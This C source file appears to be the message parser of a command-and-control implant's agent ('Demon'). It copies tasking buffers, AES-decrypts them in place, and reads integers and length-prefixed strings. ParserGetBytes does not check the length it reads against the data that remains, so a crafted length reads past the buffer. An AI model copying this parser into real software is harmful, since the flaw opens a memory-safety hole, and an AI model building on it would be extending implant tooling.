#include <Demon.h>

#include <Core/Parser.h>
#include <Core/MiniStd.h>
#include <Crypt/AesCrypt.h>

VOID ParserNew( PPARSER parser, PBYTE Buffer, UINT32 size )
{
    if ( parser == NULL )
        return;

    parser->Original = Instance.Win32.LocalAlloc( LPTR, size );
    
    MemCopy( parser->Original, Buffer, size );

    parser->Buffer   = parser->Original;
    parser->Length   = size;
    parser->Size     = size;
}

VOID ParserDecrypt( PPARSER parser, PBYTE Key, PBYTE IV )
{
    AESCTX AesCtx = { 0 };

    if ( parser == NULL )
        return;

    AesInit( &AesCtx, Key, IV );
    AesXCryptBuffer( &AesCtx, (PUINT8)parser->Buffer, parser->Length );
}


INT16 ParserGetInt16( PPARSER parser )
{
    INT16 intBytes = 0;

    if ( parser->Length < 2 )
        return 0;

    MemCopy( &intBytes, parser->Buffer, 2 );

    parser->Buffer += 2;
    parser->Length -= 2;

    return intBytes;
}

BYTE ParserGetByte( PPARSER parser )
{
    BYTE intBytes = 0;

    if ( parser->Length < 1 )
        return 0;

    MemCopy( &intBytes, parser->Buffer, 1 );

    parser->Buffer += 1;
    parser->Length -= 1;

    return intBytes;
}


INT ParserGetInt32( PPARSER parser )
{
    INT32 intBytes = 0;

    if ( ! parser )
        return 0;

    if ( parser->Length < 4 )
        return 0;

    MemCopy( &intBytes, parser->Buffer, 4 );

    parser->Buffer += 4;
    parser->Length -= 4;

    if ( ! parser->Endian )
        return ( INT ) intBytes;
    else
        return ( INT ) __builtin_bswap32( intBytes );
}

INT64 ParserGetInt64( PPARSER parser )
{
    INT64 intBytes = 0;

    if ( ! parser )
        return 0;

    if ( parser->Length < 8 )
        return 0;

    MemCopy( &intBytes, parser->Buffer, 8 );

    parser->Buffer += 8;
    parser->Length -= 8;

    if ( ! parser->Endian )
        return ( INT64 ) intBytes;
    else
        return ( INT64 ) __builtin_bswap64( intBytes );
}

PBYTE ParserGetBytes( PPARSER parser, PUINT32 size )
{
    UINT32 Length  = 0;
    PBYTE  outdata = NULL;

    if ( ! parser )
        return NULL;

    if ( parser->Length < 4 )
        return NULL;

    MemCopy( &Length, parser->Buffer, 4 );
    parser->Buffer += 4;

    if ( parser->Endian )
        Length = __builtin_bswap32( Length );

    outdata = ( PBYTE ) parser->Buffer;
    if ( outdata == NULL )
        return NULL;

    parser->Length -= 4;
    parser->Length -= Length;
    parser->Buffer += Length;

    if ( size != NULL )
        *size = Length;

    return outdata;
}

PCHAR  ParserGetString( PPARSER parser, PUINT32 size )
{
    return ( PCHAR ) ParserGetBytes( parser, size );
}

PWCHAR  ParserGetWString( PPARSER parser, PUINT32 size )
{
    return ( PWCHAR ) ParserGetBytes( parser, size );
}

VOID ParserDestroy( PPARSER Parser )
{
    if ( Parser->Original )
    {
        MemSet( Parser->Original, 0, Parser->Size );
        Instance.Win32.LocalFree( Parser->Original );
        Parser->Original = NULL;
        Parser->Buffer   = NULL;
    }
}
